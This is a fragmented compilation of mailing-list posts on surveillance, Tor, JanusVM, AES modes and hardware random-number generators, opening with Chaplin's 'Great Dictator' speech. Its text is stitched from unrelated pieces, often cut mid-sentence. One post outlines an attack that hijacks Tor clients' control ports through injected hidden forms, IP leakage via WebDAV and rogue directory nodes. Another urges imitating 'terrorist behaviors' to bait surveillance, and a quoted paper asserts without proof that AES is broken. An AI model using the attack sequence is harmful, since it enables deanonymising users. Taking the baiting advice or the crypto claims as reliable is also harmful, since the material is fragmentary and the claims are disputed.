men die, liberty will never perish. .....
"Soldiers! don't give yourselves to brutes - men who despise you -
enslave you - who regiment your lives - tell you what to do - what to
think and what to feel! Who drill you - diet you - treat you like
cattle, use you as cannon fodder. Don't give yourselves to these
unnatural men - machine men with machine minds and machine hearts! You
are not machines! You are not cattle! You are men! You have the love
of humanity in your hearts! You don't hate! Only the unloved hate -
the unloved and the unnatural! Soldiers! Don't fight for slavery!
Fight for liberty! In the 17th Chapter of St Luke it is written: "the
Kingdom of God is within man" - not one man nor a group of men, but in
all men! In you! You, the people have the power - the power to create
machines. The power to create happiness! You, the people, have the
power to make this life free and beautiful, to make this life a
wonderful adventure. Then - in the name of democracy - let us use that
power - let us all unite. Let us fight for a new world - a decent
world that will give men a chance to work - that will give youth a
future and old age a security. By the promise of these things, brutes
have risen to power. But they lie! They do not fulfil that promise.
They never will! Dictators free themselves but they enslave the
people! Now let us fight to fulfil that promise! Let us fight to free
the world - to do away with national barriers - to do away with greed,
with hate and intolerance. Let us fight for a world of reason, a world
where science and progress will lead to all men's happiness. Soldiers!
in the name of democracy, let us all unite!"

contractors don't ensure the data's accuracy, the GAO found.
    Buying commercially collected data allows the government to dodge
certain privacy rules. The Privacy Act of 1974 restricts how federal
agencies may use such information and requires disclosure of what the

government is doing the data collecting."

regarding previous discussion about baiting TLA's and resource

"It's not just about who calls who. The NSA phone-monitoring project
looks at how terrorists place their calls  and then applies that
model to everyone, to see who else might be a suspect. It's a form of
predictive data mining made famous by the notorious Total Information
Awareness project...
Today, we learn why everyone's calls had to be in the target set. The
NSA wasn't just conducting social network analysis. It was using a
more controversial data mining technique, dragged into the popular
imagination by Darpa's Total Information Awareness project, which
focuses on prediction, not connections.
Under this approach, sophisticated algorithms hunt for patterns of
terrorist behavior in information-trails, and then apply those
patterns to average citizens, seeing which ones fit. It doesn't matter
who you know. It's what you do that gets you in trouble. If you spend
money and buy plane tickets like Mohammed Atta did, then maybe you're
a terrorist, too. Same goes for the kind, and frequency, of phone
calls you make."
so, if you really felt like poking the bear, the task is simple: act
like a terrorist!
google news alerts will give you the necessary "terrorist behaviors"
that get the desired attention.  these activities range from paying
down significant credit card debt to researching critical information,
transportation, and power distribution infrastructure.

"""Although the US has ended most of their export controls for crypto

namely, to prevent the software from being exported to a few embargoed
nations, such as North Korea, Iran, Libya, Syria, and Sudan. And for
commercial encryption software that you actually pay for (not this
free public beta), there are now requirements to check customers
against government watch lists as well, which is something that
companies such as PGP comply with these days. PGP Corp volunteered to
host the public beta software on their server, with all the
appropriate checks in place. That's why you have to register, to make
sure you are not in an embargoed country, to keep me in compliance
with U.S. export laws. Been there, done that. -Philip Zimmermann"""

No. The purpose of the law is to hang the sword of damocles over the
head of anyone who wants to bring safe and secure communication to the
masses. The government doesn't want the masses to encrypt their
traffic, and they use this law to impede the distrobution of your

I think you need to give up the ghost here. If your government wants
to shut you down. they will, regardless of how much you try to comply
with export restrictions it will never be good enough. I think you

go all out in an effort to get as many people using zfone as possible.
All out. Unrestricted downloads, ease of use, ad campaign, browser

References: <20060528142414.GO26713
opportunistic IPsec requires:
- additional latency during initial communication (sometimes excessive
waiting for timeouts)
- static public IP endpoint capable of IPsec
- keys published in DNS records
== totally unworkable for most users on the Internet.
SSH/SSL VPN's are much more suitable IMHO.  tied into a p2p style
NAT-punching configuration with simple key management (perhaps
opportunistic key exchange that can be upgraded to authenticated
exchange in person, etc) this _might_ be enough to blacken a majority
of Internet traffic.
OE via IPsec is certainly not though...
Wireless networks are a different story, and I am very much in favor
of IPsec for such networks.  The propinquity of participants can
facilitate other stronger / easier key management as well.

there are some known issues / deficiencies in this release:
- DNS leaks due to transparent proxy. transparent DNS proxy when in
anonymous mode is in progress (using tor-resolve and a python DNS
- http traffic is identified by outgoing port (80, 8080, etc) rather
than traffic type. L7 matching is also in the works.
- https (SSL/TLS) traffic is passed through and not proxied.
- this runtime has not been hardened against malicious peers on the
same internal network and chroot's and other techniques are not yet
we're trying to work out logistics for torrent seeding before
distributing the build tools to remaster your own vmware installers
and customize the privacy appliance.  we're working on fixing known
issues and anticipate a
how it works in a nutshell:
- start the vmware instance with 128M ram and 200M disk (image is 38M
- a public SMB share is provided with a Run.BAT install script
- script installs a MS PPTP VPN connection to forward all traffic
through the appliance
- privacy (privoxy) and anonymity (tor) is enabled by default.  you
can select privacy only for a faster browsing experience with ads and
popups filtered.
a note on auto updates:
remove the /etc/janus directory to prevent the automatic update check.
 we intend to use this to deploy security critical patches, filtering
updates to privoxy, and other maintenance.  you can apply these
changes by hand or disable them completely as desired.

nah, that only means the masses won't be coding their own anonymity
and privacy systems, which is a good thing (the masses would fuck it
up with impressive ROT13  style).
this also means that the developers who can scratch this itch (a
usable, secure, and windows application) are going to be fewer and far
between.  don't fret, it only takes one to code it and then all your
seething masses can steep themselves in the hedonistic pleasures of
anonymity and privacy in their familiar environments.
and last but not least, regarding RAH's virtuous invitation to sling a
little logic yourself:
bitching on a mailing list about the platform specific deficiencies of
anonymity/privacy software is not likely to conjure up one of these
"usable, secure, windows capable" developers anxious to pleasure your
impatient expectations of convenience.  teaching yourself how to build
secure privacy systems [0][1] so you can meet these wants with your
own effort is more likely to result in the outcome you seek.
with that colorful retort out of the way, you are absolutely correct
about the usability and integration aspects of a given system
affecting penetration in target user base and the actual security
provided [2].
as was mentioned earlier, a virtual machine to host a well tested,
robust installation of unix'y network intensive applications on
windows is a compromise that often keeps both parties happy.  there
really is no good answer if you have to rely on the windows TCP stack
under load, especially for non server flavors of windows (that is,
even overlapped i/o will run into problems: about ~4,000 sockets last
time i tested on xp pro).
we used this virtual machine approach in janusvm [3], and tried to
focus on good usability via two methods:
a.) trimming the install process down as simple as possible (could be
better. vmware requested we cease distribution of the combined
janusvm+player+one-click-installer due to their licensing terms on the
player distribution)
b.) performing all of the anonymous Tor proxy of traffic transparently
at the network level using a default PPTP VPN route through the
virtual machine.
the user feedback has been positive, since this obviates the need for
error prone and tedious application specific configuration to use Tor,
and avoids leaking information when a plug-in or scripting facility
has the ability to bypass application proxy settings or is not
resolving addresses via SOCKSv4a / MapAddr.  (not to mention that some
applications which don't even support SOCKS or HTTP proxies can now
use Tor)
"encrypted communications as a matter of course" is not yet dead.
it's just taking a little longer than anyone expected back when the
battle was raging over cipher implementations and encrypted network
protocols with nary a thought to end user experience.

@_subject: [p2p-hackers] AES CTR vs. CBC, other [was: Re: security and 
i believe the "CTR chaining" weakness mentioned above is in regards to
the use of an explicit IV in IPsec for counter mode (CTR or CM) just
like CBC mode, for per packet synchronization, even though it is not
absolutely required. [0].
as a more general note, there are indeed some nice advantages to counter mode:
 - simplicity
  - parallelizable / pipeline-able
 - random access
  - lack of random IV's (generating entropy is hard and slow unless
you have a physical source).
and some drawbacks / constraints:
  - leaks plaintext size without padding (other modes just leak size
in terms of blocks)
 - vulnerable to time memory trade off attacks [1]
  - failure to prevent keystream reuse is catastrophic [2]
 - a strong message authentication code (MAC) must always be used [2]
as a side note, it is common to include entropy in the initial counter
value (64 bits of entropy + 64 bit counter) to avoid the time memory
trade off weaknesses.
using a random IV (like CTR in IPsec specifies) adds some overhead,
but avoids the time memory trade off as well as ensuring no keystream
reuse.  hardware entropy sources are great for this purpose since
entropy gathering daemons are notoriously slow.

bootstrapping is hard, particularly when you must include a robust
reputation metric.  "anonymous digital gold tokens" is really too
narrow, as what you seek is exactly a robust reputation / trust metric
tied to the economy of peer interaction.  digital cash is attractive
because the reputation it embodies is fungible, but other forms of
reputation are useful and may prove more effective in certain
contexts, particularly when your adversary is well funded (think
"creeping death attacks"). [0]
oh, if it were so simple!  payment alone is not sufficient, this
[dark|anonymous|private]net requires robust reputation and usability
too.  payment is part of that equation, but other incentives to
participate and contribute must be addressed.  remember mojonation /

heheh, it's going to be a fun ride.  this also points to the
"incentive" for big government to crush with extreme prejudice any
such crypto-anarcho-capitalist digital economies.  a robust and
private economy of that sort would be popular, efficient, and a clear
threat to fiat money control.  decentralized, robust reputation
metrics capable of defending against such adversaries are difficult,
to put it mildly.
i wish i could have been there; sounds like an interesting talk.
there is a lot more i'd like to discuss regarding digital bearer

some highlights:
D-Wave approach: Superconducting adiabatic quantum computer
- Extremely fast: Special purpose processor; superconducting
electronics are naturally fast (700+ GHz)
- Extremely low power: In principle reversible (zero heat generation);
in practice power consumption & heat generation drastically reduced
(factors of millions)
- At the limits of physics: Universal quantum computer can't do better
slides 14-21 are nice visualizations of the adiabatic QC implementation and use.
adiabatic quantum computation model:
- Computer initialized in "easy to reach" (convex) ground state
- Answer encoded in final state
- All currents adjusted slowly enough so that system remains in ground
state at all times
- AQC can be universal for QC  [ed: this is the crux, algorithms to
express some problems in AQC model difficult (right now)]
- AQC is exact by definition
quantum annealing computation model:
- Computer initialized in ground state
- Answer encoded in final state
- All currents adjusted over period of time fixed by user [ed: key
difference wrt AQC]
- QA is a heuristic algorithm [ed: key difference wrt AQC]
D-Wave processors can implement either AQC or QA models of computation.
Summary of preliminary result
- A set of progressively more powerful superconducting quantum
processors have been built  [ed: 28 qubits in demo]
- Next generation Q3/2008 targets competition with incumbent QUBO
solver methods (500+ qubits)
- Web services architecture operational at several levels of

vast majority of currently deployed cell phones."
this is undetectable on some models, and causes a few seconds of "one
way conference" style problems on others.  basically, you answer/call,
and get silence, neither party can hear each other for a few seconds.
"But if your battery seems to be running out of juice far too early
(despite what the phone's battery status display might claim), that
might be an indication that your phone is being used to transmit
behind your back (though a worn out battery or inaccurate battery
status display could also be the culprits).
Another clue that a phone may have been transmitting without your
permission is if it seems unexpectedly warm. You've probably noticed
how most cell phones heat up, especially on longer calls. This is
normal, but if you haven't been on any calls for a while and your cell
phone is warm as if long calls were in progress, you have another red
flag indication of something odd perhaps going on."
this is a good indicator, and particularly on some phones with
excellent battery life (some sanyo/motorola models) it becomes real
obvious when unusual battery drain is occurring.
"Finally, if you use a GSM phone (like the vast majority of phones
around the world, including Cingular and T-Mobile in the U.S.) you
have a virtually foolproof way to know if you phone is secretly
transmitting in voice mode. You've probably noticed the "buzzing"
interference that these phones tend to make in nearby speakers when
calls or data transmissions are in progress. A certain amount of
periodic routine communications between cell phones and the networks
will occur while the phones are powered on -- even when calls are not
in progress -- so short bursts of buzzing between calls (and when
turning the phones on or off) are normal.
But if you're not on a call, and you hear a continuing rapid
buzz-buzz-buzz in nearby speakers that lasts more than a few seconds
and gets louder as you approach with your phone, well, the odds are
that your phone is busily transmitting, and bugging is a definite
possibility. Note that this particular test is much less reliable with
non-GSM phones that use CDMA (e.g. Sprint/Verizon phones), since
CDMA's technology is less prone to producing easily audible local
interference. This strongly suggests that CDMA phones may be preferred
for such bugging operations."
this is a smoking gun on a GSM phone, and unfortunately it does not
work against CDMA, as mentioned.
take the battery out, it works great. :)

I read this in cryptome today and it makes me puzzled: did somebody
piss you off? Or is this the a nugget of distilled wisdom from
somebody else?
Cryptome: Spies and ex-spies are required by terms of employment and
training to lie, deceive, betray, commit crimes, and keep it secret.
If they cannot convincingly lie and break laws without getting caught
under all kinds of conditions as taught and tested in the US at the
Farm, they will not be hired. They lie to families and friends, to
everybody not in spyworld and often in spyworld too as a test and as a
duty. They are experts at appearing to be what they are not.
It is a common spy tradecraft to claim to be an ex-spy or ex-agent,
aggrieved, ready to spill secrets, their managers feigning offense,
blessing the spew by invoking national security threats, pretending
the miscreant is a rogue.
No spy or ex-spy ever tells the full story, only offers enticing tales
that mesmerize the gullible and attempts to outwit accomplished
doubters, whether other spies, agents, journalists, oversight
committees, investigative commissions or the public. None are ever
free to tell all they know, and face severe penalties if not death for
telling more selected secrets than allowed to lend credence to their
deceptions. So come the orchestrated dissenters, scholars, novelists,
confessors, professors, exposers of perfidy and anonymous leakers,
dispensing plausible disinformation purpose-made.
That's the deal spies and agents sign on to and cannot ever escape,
and are told so at the time of engagement, not that many want out of
the privileges such as that provided by the bountifully bloated US
Intelligence Community Management Fund which bribes sealed lips, most
assuredly for retirees and exes continuing to work their undercover
Anybody who claims to be a spy or ex-spy is a person unable to tell
the truth, and gets paid and pensioned for well-crafted accounts of
what is not, what to fear, what to doubt, who to distrust. Analyze the
Association For Intelligence Officers (AFIO),  and
numerous similar organizations around the planet for what they tell
and what they conceal in open deception.
The pervasive lies of spyworld -- officers, agents, contractors and
overseers -- undermine and corrupt culture, language, trust, law and

ah, outrage and disbelief...  seems like ages ago i could muster such
reaction to the abuse of powers that be.
In July 1987, then-Representative Dick Cheney, the top Republican on
the committee investigating the Iran-contra scandal, turned on his
hearing room microphone and delivered, in his characteristically
measured tone, a revolutionary claim...
"I personally do not believe the Boland Amendment applied to the
president, nor to his immediate staff," Cheney said.
Most of Cheney's colleagues did not share his vision of a presidency
empowered to bypass US laws governing foreign policy. The committee
issued a scathing, bipartisan report accusing White House officials of
"disdain for the law."
Cheney refused to sign it. Instead, he commissioned his own report
declaring that the real lawbreakers were his fellow lawmakers, because
the Constitution "does not permit Congress to pass a law usurping
Presidential power."
The Iran-contra scandal was not the first time the future vice
president articulated a philosophy of unfettered executive power --
nor would it be the last. The Constitution empowers Congress to pass
laws regulating the executive branch, but over the course of his
career, Cheney came to believe that the modern world is too dangerous
and complex for a president's hands to be tied. He embraced a belief
that presidents have vast "inherent" powers, not spelled out in the
Constitution, that allow them to defy Congress.
Cheney bypassed acts of Congress as defense secretary in the first
Bush administration. And his office has been the driving force behind
the current administration's hoarding of secrets, its efforts to
impose greater political control over career officials, and its
defiance of a law requiring the government to obtain warrants when
wiretapping Americans. Cheney's staff has also been behind President
Bush's record number of signing statements asserting his right to
disregard laws.

right.  tap all the interesting fibers, feed to narus.
the narus is there specifically so they don't have to backhaul a
mirror of the traffic.  it does all the inspection to isolate
interesting information, then sends back that interesting information
to aggregation points, before that in turn is sent on to NSA.
the bridgeton center att noc is a good example.  there is a room
controlled by multi-factor biometric authentication (print, retinal)
with man trap doors.  this is probably the room used for distributing
configuration to the remote monitoring points (it's unlikely they
store much of interest at the remote sites, since the security is much
lower at these places) as well as aggregation of the feeds for
backhaul to NSA.
see also the new NSA facilities being built in denver, CO.  this is an
ideal place to aggregate traffic across the country...
from the sounds of it, the taps did introduce some problems which were
resolved quickly.  probably not from signal loss, but who knows.

We describe a new simple but more power-
ful form of linear cryptanalysis. It appears to break AES
(and undoubtably other cryptosystems too, e.g. SKIP-
JACK). The break is "nonconstructive," i.e. we make it
plausible (e.g. prove it in certain approximate probabilis-
tic models) that a small algorithm for quickly determining
AES-256 keys from plaintext-ciphertext pairs exists b but
without constructing the algorithm. The attack's runtime
is comparable to performing 64w encryptions where w is
the (unknown) minimum Hamming weight in certain bi-
nary linear error-correcting codes (BLECCs) associated
with AES-256. If w < 43 then our attack is faster than ex-
haustive key search; probably w < 10. (Also there should
be ciphertext-only attacks if the plaintext is natural En-
AES's current status. In view of both (a) Bernstein's tim-
ing attack, (b) our nonconstructive argument for a cracking
algorithm, (c) the possibility of a "'trapdoor," we believe that
   1. AES should be abandoned
   2. cryptosystems provably immune to these attacks should
      be investigated, and
   3. our argument for crack-existence, since it is nonrigor-
      ous5 , should be investigated more carefully.
3.6    Now get paranoid
Suppose AES-256's designers had evilly arranged matters so
that some "code of the code" (known to them) unexpectedly,
contained a remarkably low-weight word (known to them),
with say, w 10. That would constitute a trapdoor enabling
cracking it with much smaller eo,ort 64w . If w = 10, they
could crack AES with 6410 = 260 pc-pairs. If w = 7 then
AES-256 would be as easy to crack as the cited attacks on
DES (only 242 pc-pairs needed)!
This could be the case even if the random codes approxima-
tion underlying our crude analysis in B'3.3 was invalid.
4 What now?
Obviously, B'2's strengthened form of linear cryptanalysis will
attack a wide variety of secret key cryptosystems, not just
AES-256, and will quite often raise the worry that there might
exist some intentionally or unintentionally inserted "trap-
door." I currently see no feasible way for AES's designers
to disprove the existence of this kind of trapdoor. And Bern-
stein's cache-timing attack [4] seems applicable against es-
sentially any system that employs Sboxes. That's a lot of
In short, almost every secret key cryptosystem yet proposed is
now busted or at least suspect. We need to design new kinds
of cryptosystems immune to both kinds of attack.

accidentally gives you a copy of a document marked "top secret." And
it contains a log of some of your private phone calls.
You read it and ponder it and wonder what it all means. Then, two
months later, the FBI shows up at your door, demands the document back
and orders you to forget you ever saw it.
... al-Buthi and Al-Haramain's American branch were added to the
government's public list of terrorists on Sept. 9, 2004, just weeks
after the government turned over the call log to the charity's
attorneys. It's not clear when officials realized they'd given a
highly classified document to an organization they considered
terrorist, but the FBI showed up at Belew's office in October and
demanded the call log back, advising the lawyer not to attempt to
remember the document's contents.
By then, Belew had given a copy of the document to Washington Post
reporter David Ottaway, who had been writing about how the government
investigated and listed individuals and groups suspected of funding
terrorism. Ottaway did not report on the classified call log, and when
the FBI called, the Post dutifully handed over its copy.
That might have been the end of it. But in December 2005 The New York
Times revealed that the government had been spying on Americans'
overseas communications without warrants, and Al-Haramain's lawyers
realized why the FBI had been so adamant about getting the document
"I got up in the morning and read the story, and I thought, 'My god,
we had a log of a wiretap and it may or may not have been the NSA and
on further reflection it was NSA," says Thomas Nelson, who represents
Al-Haramain and Belew. "So we decided to file a lawsuit."

i am also curious if you had considered lower layer propinquity of

seemingly disparate and redundant paths are often inhabiting common
right of way and facilities.  is the assumption that inspection at

mentioned TLA/$gov adversaries?
given the surprises looking at network topology from an IX rather than
AS level, i'd expect a similar revelation when viewing from an optical

---------- Forwarded message ----------
Some of you might remember my email to this list in February, where I
asked for help from operators of Tor nodes in the UK [1]. This was for
an experiment to establish how diverse the topology of the Tor network
is -- an important component of how secure it is against traffic
analysis. Thanks to all those who responded to my request; I had a
great response and very interesting results.
I've now finished the draft version of the resulting paper, which is
to be presented at the PET Workshop (Ottawa, Canada, June 20--22 2007)
[2]. The latest version of the paper can be found at this URL:
 There is also an introduction to the area, and a summary of the paper
on my research group's blog "Light Blue Touchpaper":
 My paper, co-authored with Piotr Zielinksi, is a follow-up to Nick
Feamster and Roger Dingledine's paper, "Location Diversity in
Anonymity Networks" [3]. In it, they point out that bouncing anonymity
network traffic around lots of countries might not be as good as it
seems because there are a small number of ISPs which show up on many
of the links to, from and between Tor nodes.
What our paper explores is that even if you deal with this problem,
and choose paths with a diverse collection of ISPs, there are still
Internet exchanges on many of the paths. These do not appear in the
BGP data that Feamster and Dingledine use, which is why I had to
resort to a more limited-scale traceroute-based study.
So not only are Internet Exchanges good places to put traffic analysis
equipment, but some (including LINX [4] and AMS-IX [5]) collect the
necessary data anyway, for performance measurement purposes. They only
record the headers of one in every few thousand packets, but our paper
also shows that, even with such low-quality data, traffic analysis
still works.
There's certainly no reason to panic about these results, as there is
still much more work to be done in this area. For example, the picture
in the US, where Internet exchanges are less popular, will likely be
different. I do hope that the paper will encourage future work on both
establishing more accurate estimates of attack costs and developing

the exit wall of sheep (embassy passwds) was lame but the control port
opener was nifty.
sequence for the control port payload injection:
- two vectors for form payload, a third for ip leakage across three
proxies on broadband
- javascript posts form automatically to localhost:9051 using:
 action=" method="post"
enctype="multipart/form-data" target="stylearea"  [that last to keep
the response from the tor control part spewing over the current page -
this puts it in a hidden iframe]
- all existing <FORM's in exit requests modified via proxies to inject
the TEXTAREA with payload into a hidden form element while leaving the
appearance of a legitimate form page (so any submit pwns, too late.
even lynx on openbsd if your control port is on 127.0.0.1:9051 (or any
accessible port if you've got a motivated attacker...))
- IP leakage for all IE on win32 users that aren't using a transparent
proxy (janusvm) via SMB/NetBIOS and WebDAV to external host with
tracking nonce directory name.  even if the control port is not open,
this will leak the origin of the request as webdav is below the
browser, interpreted in the file system / win32 api context. (SMB is
not nearly as useful as webdav since most ISPs filter NetBIOS and
SMB/CIFS traffic even if you explicitly allow at the router.)
- the purpose of the payload was an interesting 150-200k+ command set
for the control port to apply.  among various things this performed
the following:
- redirect the notice log to /dev/null on *nix like systems or to a
webdav path on one of the proxies. (this leaks ip immediately on win32
in addition to routing ongoing notices messages to the proxy directly.
- invalidate all known authentic nodes on the existing Tor network via
ExcludeNodes with digests, configure three new rogue nodes as
authoritative directories and exits, and finally starting a hidden
service and posting the .onion name to the proxy server.
- map local ports to the hidden service onion allowing an anonymous
user on the rogue Tor network to arbitrarily connect to the client
onion and interface with their Tor control port in real time.
- vulnerable Tor clients (not using transparent proxy like janusvm)
start falling by the thousands into the rogue Tor network for the
duration of a few hours while the attack was being tested...
of course, vmware just got their asses handed to them recently as well:
qemu/virtual box looks much more promising; perhaps supported soon...

@_subject: Toshiba tips random-number generator IC, is disingenuous 
i've been using the VIA padlock XSTORE instruction for entropy since
at least 2003, back when the C5XL hit the stage and you had a single
source (a combination of three free wheeling oscillators).
the next revision, the C5P, and all C5/C7 cores since than have
included two of these sources, individually selectable or capable of
working in tandem. (6 oscillators)
the throughput of these devices varies from 200k-2Mbps in a most
paranoid configuration, with whitener enabled and a conservative
sampling, up to more than 100Mbps in dual full throttle configuration
(which should only be used when the on die AES or SHA1 is applied to
obscure TRNG bias).
Toshiba Corp. has claimed a major breakthrough in the field of
security technology: It has devised the world's highest-performance
physical random-number generator (RNG) circuit.
The device generates random numbers at a data rate of 2.0 megabits a
second, according to Toshiba in a paper presented at the International
Solid-State Circuits Conference (ISSCC) here.
i must assume they are splitting hairs here, as VIA is not the only
one to outperform such benchmarks, but you do buy the whole chip, not
a stand-alone TRNG IC component.
in any case, it is amusing that they got such mileage from a
masturbatory press release, while things like padlock, integrating
crypto directly into CPU instructions, seems to garner less respect
and press.
last but not least, i recently purchased an Everex 15.4" StepNote
NC1610 Laptop PC w/ Via C7-M Processor [0].  spend the $30 to bring
this up to 2G of ram, and you've got an excellent little linux laptop
that can handle full disk crypto with ease (i've even benchmarked
loop-aes with 32 rounds in AES-256, just for fun, which the XCRYPT
instruction handles without breaking a sweat).
if you're concerned about all that border search stupidity, and tired
of software FDE or cryptainer compromises, this is a great
i've long been a fan of these cores, and i think any cypherpunk would
appreciate the capability these tiny, low power chips posses in terms
of crypto horsepower.
[i will, however, never forgive them for the abomination that is the
padlock hash engine.  why they required the SHA instruction to
finalize, limited the digest input size, and requiring an elaborate
fault to get an un-finalized state, is beyond me.  however, the rest
of the chip makes of up such a shortcoming, all things considered]

it is useful to whiten and/or mask any potential bias of the entropy
source with a run through a cipher or digest.  it's important to note
that you should be verifying entropy before this step (FIPS sanity
checks) otherwise your RNG could be highly biased and you'd not notice
from the whitened, masked output.
there are two schools of hardware entropy harvesting thought:
- use a von Neumann whitener to distill the raw entropy into a high
quality, low (single bit) bias source. this will also cut throughput
by an order of magnitude, perhaps.
- use a block cipher or digest to mask any bias that may be present in
an un-whitened, wide open source.
the latter seems to be gaining popularity, and of course it doesn't
hurt to do both.
this is indeed not a huge leap over VIA padlock's dual on core sources
(XSTORE) which also have AES on core for the masking above - these can
hit 100Mbps with whitening disabled and both sources enabled.  if
you're initializing FDE drives with good entropy this 1.7Gbps might be
useful.  otherwise i have a hard time consuming even a fraction of the
available entropy on a VIA system in normal use.

i was focused on the whitened vs. raw entropy in the previous post and
overlooked the point you were getting at.
it is good practice to use more than one hardware entropy source in a
system.  (on VIA's boards, only the first gen C5XL cores had a single
source, after that two are always present).
if one fails you have a backup and combined they can double
throughput.  if your requirements necessitate a high throughput
hardware (true) entropy source you can't fall back on software and
host entropy scavenging - it's just too slow. so you get two or more
sources and expect at least one to be functional for the lifetime of
the system.
there doesn't seem to be any additional technical detail about this
setup so perhaps we'll find out more later...

my apologies for focusing solely on the price/money angle. there is a
good post about incentives on the Tor blog that covers similar ideas
and discusses the complexities and pit falls associated:
using loom for settlement is probably too much overhead for Tor but is
aiming closer to what is needed.
my issue with money payment in particular is described in this paragraph:
"On top of that are the social implications of adding money into the
system. Nick keeps reminding me of sociological studies saying that
rewarding volunteers with t-shirts makes them feel good about their
contribution, whereas rewarding them with a small amount of cash makes
them subconsciously start to value their contribution based on the
cash you give them. So they're more likely to stop volunteering, as
they don't feel their effort is properly appreciated. More details
here[0], here[1], and here[2]. It's hard to say how right this
research is, but it seems a rough set of variables to add in if we can
avoid it."

@_subject: hardware acceleration available for Tor ? On FreeBSD ? 
speeding up OpenSSL derived CTR mode with hardware acceleration is
useful. (the HardwareAccel and EngineName options above)
speeding up Tor with native hardware acceleration and chained /
repetitive CTR offload is a much bigger win. as an example the VIA
Padlock engine can do a few score MBytes/sec aes 128 with small/single
block sizes like those used when HardwareAccel is on and EngineName
padlock set. if you could utilize the maximum 16KByte rep instruction
mode directly goes well over a gigabyte / second. this is also why the
native Solaris API CTR mode gives much better performance than the
OpenSSL engine acceleration.
speeding up OpenSSL pubkey ops also helps. as of OpenSSL 0.9.9 and
1.0.x you can build OpenSSL with padlock MONTMULT acceleration. still
no dynamic engine support for pubkey ops iirc...
there will be some benefit as Tor wraps a CTR mode around
(accelerated) OpenSSL ECB mode. the problem is that this method is
limited to single blocks per call, rather than long buffers optimized
for crypto offload.
you may also get SHA acceleration. the notices log should say, for example:
[info] crypto_global_init(): Initializing OpenSSL engine support.
[info] crypto_global_init(): Initializing dynamic OpenSSL engine
"padlock" acceleration support.
[info] crypto_global_init(): Loaded dynamic OpenSSL engine "padlock".
[info] crypto_global_init(): Loaded OpenSSL hardware acceleration
engine, setting default ciphers.
[info] Using default implementation for RSA
[info] Using default implementation for DH
[info] Using default implementation for RAND
[notice] Using OpenSSL engine VIA PadLock: RNG (not used) ACE2
PHE(8192) PMM  [padlock] for SHA1
[info] Using default implementation for 3DES
[notice] Using OpenSSL engine VIA PadLock: RNG (not used) ACE2
PHE(8192) PMM  [padlock] for AES
not necessarily, per above :)
it would also be nice to have these routines native for other engines,
like padlock. however this is not a small amount of effort and no one
with time and skill has shown an interest yet. (Tor buffer allocation
alignment to 16K, inline padlock instr. calls in REP mode, and other
changes required.)
there are kernel cryptographic facilities including asm optimized and
hardware accelerated crypto primitives. these are usually not utilized
from userspace directly. there are PKCS specs for communicating with
offload devices in a concise manner, and libs of various types to
speak this to myraid hardware. perhaps a longer discussion should be
taken off list...
the T2 is core acceleration and thus higher throughput for most
purposes. the 6000 is useful as a hardened private key store service
for your less trusted OS and software to cooperate with.
Tor would need to be updated to take advantage of the new CTR mode in
the OpenSSL API calls, but then the same HardwareAccel (and AccelName)
options would provide a significant improvement over the previous
acceleration mode.

 Since Intel
uh, what? you realize you're comparing a very noisy but very very
small entity against the remaining core of a modern many hundred
million gate processor right?
you can certainly disable / idle the sources when not needed, but
really, left wide open all the time they're a drop in the bucket.
it is the throughput and efficiency that makes it most useful. like
the AES XCRYPT instruction in VIA Padlock cores. you may avoid a
number of cache timing and other timing based side channel attacks on
software cipher implementations using hw as well, since they often
execute one or more rounds in a handful of cycles. there are probably
other advantages.
the crypto cluefull know the value of mixing a high throughput, easily
managed entropy source with host and application true random number
facilities (/dev/random, /dev/urandom, OpenSSL random engine support,
XSTORE instruction in userspace, etc.)
the key to using a hw source properly:
1. initialize, measure, and mix the raw source(s) with a userspace
entropy daemon.
2. continuously sanity check the read data over a large byte span and
remove a hardware entropy source that is not functioning within
comfortable tolerance. FIPS does have a nice suite of checks - again,
this can't prove your source is robust, only that it doesn't suck
horribly and obviously. :)
3. run the hw random data through a block cipher or hash digest to
mask generator bias before adding to host entropy facilities with a
conservative entropy density estimate. while the VIA and other good HW
sources can produce very high density output i prefer at most an 80%
estimation on input for robust distribution into the host pool as
4. periodically save state for use with mixing initialization in step
 on next restart.
5. monitor without writing if anomalies in the hw sources arise during
operation. with VIA XSTORE on C5P or greater (not C5XL with single
source) you have two independent sources which can be enabled or
disabled as needed. on such systems you can fall back to half-rate
throughput on the good source if the other goes bad.
if you mean "raw" as in omitting all of the steps above and just
reading /dev/hwrandom then i agree. otherwise, see above. :)
i can get > 80Mbps of entropy on VIA hw entropy sources. have you ever
tried to use /dev/random on a headless server? a recently booted
workstation? for more than a few keys at a time? etc?
keep secure state, properly mixed, and even a highly biased input
would be whitened and obscured beyond utility. i'd like to see
reasoning otherwise for XSTORE sources and XCRYPT AES mixing before
conservatively mixed into properly seeded /dev/random kernel pool. if
it is too biased (OpenSSL weak keys :) then the FIPS sanity checks
will kick it out and you're denied entropy rather than compromised
it's really a shame crypto isn't standard on every DIE. although if
they do a poor job of it the annoyance outweighs the utility. the SHA
instruction on Padlock borders on unusable without hacks like
interrupting the REP mode instruction with a fault/intr. so you can
grab the un-finalized work-in-progress digest state for large

i agree completely on all of the sad realities related to the
non-existence of pervasive hw crypto facilities.
the power consumption argument is a strawman though. the VIA docs
stated a power consumption difference when XSTORE is configured and
polled frequently vs. explicitly disabled and unused. the details are
fuzzy though, and i suspect it's the rest of the pipeline around
actual use of HWRNG state and moving across cache/bus lines...
i would be curious to know the power details on any of the hw entropy
sources, if any are out there.

On Wed, Mar 24, 2010 at 8:43 AM, Morlock Elloi be actively controlled as each junction is different) is a good source of
randomness (up to megabits / sec / junction), "encrypting" it just means
masking possible low entropy. I'd prefer to see raw conditoned stream than
"encrypted" one (even web content looks high-entropy to Diehard when
i have loved the padlock engines on via cores since they hit the
market in C5XL form with a single hw generator available via XSTORE.
unlike many designs this free wheeling resource can provide a torrent
of entropy sufficient to sate even the most gregarious consumption.
as mentioned above, you need a fast user space entropy daemon sanity
checking the raw, (probably) biased stream coming from hardware but it
is still good practice to digest this entropy to obscure any potential
generator state/bias heading into the host entropy pool.
that is to say, of the two common modes for utilizing hw entropy:
a. conservatively sample from a whitened, string filtered entropy
source for a low rate of high quality output (see xstore config words)
b. ramp un-whitened, un-filtered source(s) to maximum rate and AES/SHA
mix for high throughput, high quality output while irreversibly
masking generator bias/state present in the raw source stream.
the latter is more effective in practice and capable of generation
rates > 20Mbps with full FIPS sanity checks. the former tops out
around 1Mbps or less with more transient latency spikes on read (when
successive attempts to read fail to pass whiten+strfilter). note that
padlock engine supports SHA and AES on die as well making these easy
and fast to apply to generator output.
if you are still concerned a more conservative configuration would
estimate entropy density while feeding from raw input stream and add
